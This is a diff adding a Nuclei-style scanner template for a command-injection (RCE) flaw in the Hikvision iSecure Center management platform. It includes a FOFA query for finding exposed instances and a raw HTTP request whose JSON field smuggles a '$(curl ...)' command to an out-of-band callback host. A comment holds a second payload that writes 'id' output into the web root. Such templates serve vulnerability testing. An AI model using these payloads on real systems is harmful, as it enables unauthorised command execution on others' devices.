@@ -1,0 +1,31 @@
+id: hikvision-iSecure-Center-detection-rce
+
+info:
+  name: 海康威视综合安防管理平台 detection.js - rce
+  author: Co5mos
+  severity: critical    
+  metadata:
+    verified: true
+    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
+  tags: rce, hikvision, oob
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /center/api/installation/detection;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type": "environment", "operate": "", "machines": {"id": "$(curl http://{{interactsh-url}})"}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# here we can upload file
+# {"type":"environment","operate":"","machines":{"id": "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}
